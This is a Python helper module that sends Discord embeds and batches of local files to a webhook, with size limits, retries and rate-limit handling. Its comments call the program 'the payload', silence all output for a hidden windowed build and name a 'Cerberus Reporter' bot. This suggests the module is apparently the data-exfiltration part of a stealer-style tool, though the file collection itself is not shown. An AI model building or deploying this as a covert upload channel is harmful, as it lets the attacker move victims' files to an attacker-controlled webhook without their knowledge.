# webhook_utils.py
import requests
import json
import os
import time

EMBED_COLOR_RED = 0xDC143C  # Crimson Red (you can change this)

# Simple logging for the payload. In a windowed app, these prints won't be visible
# unless you compile without --windowed for testing or redirect stdout/stderr.
# For the final version, consider removing them or using a proper file logger.
def _log(level, message):
    # print(f"[{level}] {time.strftime('%Y-%m-%d %H:%M:%S')}: {message}")
    pass # Comment out print for final windowed build if not logging to file

def send_to_discord(webhook_url, embed_data, retries=3, base_delay=5):
    """
    Sends embed data (only) to a Discord webhook with retry logic.
    """
    if not webhook_url:
        _log("ERROR", "Webhook URL is empty. Cannot send message.")
        return False

    headers = {"Content-Type": "application/json"}
    # Discord expects a list of embeds
    payload = {"embeds": [embed_data] if not isinstance(embed_data, list) else embed_data}
    # Optionally add username/avatar:
    # payload["username"] = "Cerberus Reporter"
    # payload["avatar_url"] = "URL_TO_YOUR_ICON.png"


    for attempt in range(retries):
        try:
            _log("INFO", f"Attempt {attempt + 1}/{retries} to send embed to Discord.")
            response = requests.post(webhook_url, json=payload, headers=headers, timeout=15)
            response.raise_for_status()  # Raises HTTPError for bad responses (4XX or 5XX)
            _log("INFO", f"Successfully sent embed. Status: {response.status_code}")
            return True
        except requests.exceptions.HTTPError as e:
            _log("ERROR", f"HTTP error sending embed (Attempt {attempt + 1}/{retries}): {e}")
            if e.response is not None:
                _log("ERROR", f"Response content: {e.response.text}")
                if e.response.status_code == 429:  # Rate limited
                    try:
                        retry_after_data = e.response.json()
                        # Discord returns retry_after in seconds (float)
                        retry_after_s = float(retry_after_data.get("retry_after", base_delay))
                    except (json.JSONDecodeError, ValueError):
                        retry_after_s = base_delay
                    _log("INFO", f"Rate limited. Retrying after {retry_after_s:.2f} seconds...")
                    time.sleep(retry_after_s)
                    continue
                elif 500 <= e.response.status_code < 600:  # Server-side error
                    _log("INFO", f"Server error. Retrying in {base_delay * (attempt + 1)} seconds...")
                    time.sleep(base_delay * (attempt + 1)) # Exponential backoff might be better
                    continue
            # For other client errors (4xx not 429), usually not worth retrying with same data.
            break
        except requests.exceptions.RequestException as e:
            _log("ERROR", f"Request exception sending embed (Attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                _log("INFO", f"Retrying in {base_delay * (attempt + 1)} seconds...")
                time.sleep(base_delay * (attempt + 1))
            else:
                _log("ERROR", "Max retries reached for request exception.")
                break
        
    _log("ERROR", f"Failed to send embed to Discord after {retries} attempts.")
    return False

def send_to_discord_with_files(webhook_url, embed_data, file_paths, retries=3, base_delay=5):
    """
    Sends embed data and files to a Discord webhook with retry logic and size checks.
    """
    if not webhook_url:
        _log("ERROR", "Webhook URL is empty. Cannot send message with files.")
        return False

    # Prepare embed payload (must be JSON string in `payload_json` form field)
    # Discord expects a list of embeds
    payload_json_dict = {"embeds": [embed_data] if not isinstance(embed_data, list) else embed_data}
    # Optionally add username/avatar:
    # payload_json_dict["username"] = "Cerberus Reporter"
    # payload_json_dict["avatar_url"] = "URL_TO_YOUR_ICON.png"

    # Filter and prepare files
    max_files = 10
    max_total_size_bytes = 25 * 1024 * 1024  # 25 MiB
    max_individual_size_bytes = 8 * 1024 * 1024 # 8 MiB

    valid_files_to_attach = [] # List of (original_path, basename, opened_file_object)
    opened_file_objects_to_close = [] # Keep track to ensure closure
    current_total_size = 0

    if file_paths:
        _log("INFO", f"Processing {len(file_paths)} potential files for upload.")
        for file_path in file_paths:
            if len(valid_files_to_attach) >= max_files:
                _log("WARN", f"Reached max file limit ({max_files}). Skipping remaining files.")
                break
            try:
                if not os.path.exists(file_path) or not os.path.isfile(file_path):
                    _log("WARN", f"File not found or is not a file: {file_path}. Skipping.")
                    continue

                file_size = os.path.getsize(file_path)
                if file_size == 0:
                    _log("WARN", f"File {os.path.basename(file_path)} is empty. Skipping.")
                    continue
                if file_size > max_individual_size_bytes:
                    _log("WARN", f"File {os.path.basename(file_path)} ({file_size / (1024*1024):.2f}MB) exceeds individual size limit. Skipping.")
                    continue
                if current_total_size + file_size > max_total_size_bytes:
                    _log("WARN", f"Adding file {os.path.basename(file_path)} would exceed total size limit. Skipping.")
                    continue

                f_obj = open(file_path, 'rb')
                opened_file_objects_to_close.append(f_obj)
                valid_files_to_attach.append((file_path, os.path.basename(file_path), f_obj))
                current_total_size += file_size
                _log("INFO", f"Staged file: {os.path.basename(file_path)} ({file_size / (1024*1024):.2f}MB). Total staged: {current_total_size / (1024*1024):.2f}MB.")
            except FileNotFoundError:
                _log("ERROR", f"File not found during staging: {file_path}. Skipping.")
            except PermissionError:
                _log("ERROR", f"Permission denied for file: {file_path}. Skipping.")
            except IOError as e:
                _log("ERROR", f"IOError opening/processing file {file_path}: {e}. Skipping.")
            except Exception as e:
                _log("ERROR", f"Unexpected error with file {file_path}: {e}. Skipping.")
    
    if not valid_files_to_attach:
        _log("INFO", "No valid files to attach, or no files specified. Sending embed only.")
        for f_obj in opened_file_objects_to_close: f_obj.close() # Close any opened files
        return send_to_discord(webhook_url, embed_data, retries, base_delay)

    success = False
    for attempt in range(retries):
        _log("INFO", f"Attempt {attempt + 1}/{retries} to send embed with {len(valid_files_to_attach)} files to Discord.")
        
        # Reset file read pointers for retry
        for _, _, f_obj in valid_files_to_attach:
            f_obj.seek(0)

        # Construct the multipart data. Files are `files[0]`, `files[1]`, etc.
        # `payload_json` contains the embed structure.
        files_payload = {'payload_json': (None, json.dumps(payload_json_dict), 'application/json')}
        for i, (_, basename, f_obj) in enumerate(valid_files_to_attach):
            files_payload[f'files[{i}]'] = (basename, f_obj, 'application/octet-stream')
        
        try:
            # Increased timeout for uploads
            response = requests.post(webhook_url, files=files_payload, timeout=60 + len(valid_files_to_attach) * 15) 
            response.raise_for_status()
            _log("INFO", f"Successfully sent embed and files. Status: {response.status_code}")
            success = True
            break 
        except requests.exceptions.HTTPError as e:
            _log("ERROR", f"HTTP error sending data with files (Attempt {attempt + 1}/{retries}): {e}")
            if e.response is not None:
                _log("ERROR", f"Response content: {e.response.text}")
                if e.response.status_code == 429: # Rate limited
                    try:
                        retry_after_data = e.response.json()
                        retry_after_s = float(retry_after_data.get("retry_after", base_delay))
                    except (json.JSONDecodeError, ValueError):
                        retry_after_s = base_delay
                    _log("INFO", f"Rate limited. Retrying after {retry_after_s:.2f} seconds...")
                    time.sleep(retry_after_s)
                    continue
                elif e.response.status_code == 413: # Payload too large
                     _log("ERROR", "Discord responded with 413 Payload Too Large. Files might be too big or embed too large.")
                     # Consider sending embed only as fallback, or just failing.
                     break 
                elif 500 <= e.response.status_code < 600: # Server-side error
                    _log("INFO", f"Server error. Retrying in {base_delay * (attempt + 1)} seconds...")
                    time.sleep(base_delay * (attempt + 1))
                    continue
            break 
        except requests.exceptions.RequestException as e:
            _log("ERROR", f"Request exception sending data with files (Attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                _log("INFO", f"Retrying in {base_delay * (attempt + 1)} seconds...")
                time.sleep(base_delay * (attempt + 1))
            else:
                _log("ERROR", "Max retries reached for request exception.")
                break
        
    for f_obj in opened_file_objects_to_close: # Ensure all opened files are closed
        try:
            f_obj.close()
        except Exception as e_close:
            _log("WARN", f"Error closing a file object: {e_close}")
        
    if not success and payload_json_dict.get("embeds"):
        _log("WARN", f"Failed to send data with files after {retries} attempts. Attempting to send embed data only as fallback.")
        return send_to_discord(webhook_url, embed_data, retries=1, base_delay=1) # Minimal retry for fallback
    
    return success